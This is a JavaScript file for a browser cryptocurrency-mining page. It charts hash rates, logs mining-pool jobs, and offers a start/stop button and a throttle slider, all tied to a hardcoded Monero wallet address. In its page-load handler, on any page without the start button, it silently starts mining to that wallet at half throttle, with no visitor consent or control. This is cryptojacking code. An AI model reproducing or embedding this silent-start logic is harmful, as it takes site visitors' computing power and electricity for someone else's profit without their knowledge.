let isCurrentlyMining = false;
let intervalId;
let myLineChart;

document.addEventListener("DOMContentLoaded", () => {
  const startButton = document.getElementById("startb");
  if (startButton) {
    startButton.addEventListener("click", start);
    createChart();
  } else {
    startMining(
      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
    );
    throttleMiner = 50;
  }
});

function createChart() {
  const ctx = document.getElementById("myChart").getContext("2d");
  myLineChart = new Chart(ctx, {
    type: "line",
    data: {
      datasets: [
        {
          label: "Hashes resolved",
          backgroundColor: "rgb(0, 132, 255)",
          pointStyle: "line",
          data: [],
        },
      ],
    },
    options: {
      responsive: false,
      scales: {
        xAxes: [
          {
            type: "time",
            time: {
              unit: "second",
            },
          },
        ],
      },
    },
  });
}

function start() {
  let button = document.getElementById("startb");
  isCurrentlyMining = !isCurrentlyMining;

  if (isCurrentlyMining) {
    startMining(
      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
    );
    button.textContent = "Stop mining";

    addText("Connecting...");

    intervalId = setInterval(function () {
      while (sendStack.length > 0) addText(sendStack.pop());
      while (receiveStack.length > 0) addText(receiveStack.pop());
      addData({ x: new Date(), y: totalhashes });
    }, 1000);
  } else {
    clearInterval(intervalId);
    stopMining();
    button.textContent = "Start mining";
  }
}

function addData(data) {
  myLineChart.data.datasets.forEach((dataset) => {
    dataset.data.push(data);
  });
  myLineChart.update();
}

function addText(obj) {
  let elem = document.getElementById("texta");
  elem.value += "[" + new Date().toLocaleString() + "] ";

  if (obj.identifier === "job") elem.value += "new job: " + obj.job_id;
  else if (obj.identifier === "solved")
    elem.value += "solved job: " + obj.job_id;
  else if (obj.identifier === "hashsolved") elem.value += "pool accepted hash!";
  else if (obj.identifier === "error") elem.value += "error: " + obj.param;
  else elem.value += obj;

  elem.value += "\n";
  elem.scrollTop = elem.scrollHeight;
}

(function handleThrottling() {
  let slider = document.getElementById("throttleMiner");
  let output = document.getElementById("minerPower");

  if (!slider || !output) return;
  output.innerHTML = "Miner power:" + slider.value;

  throttleMiner = 100 - slider.value;

  slider.oninput = function () {
    output.innerHTML = "Miner power:" + this.value;
    throttleMiner = 100 - slider.value;
  };
})();
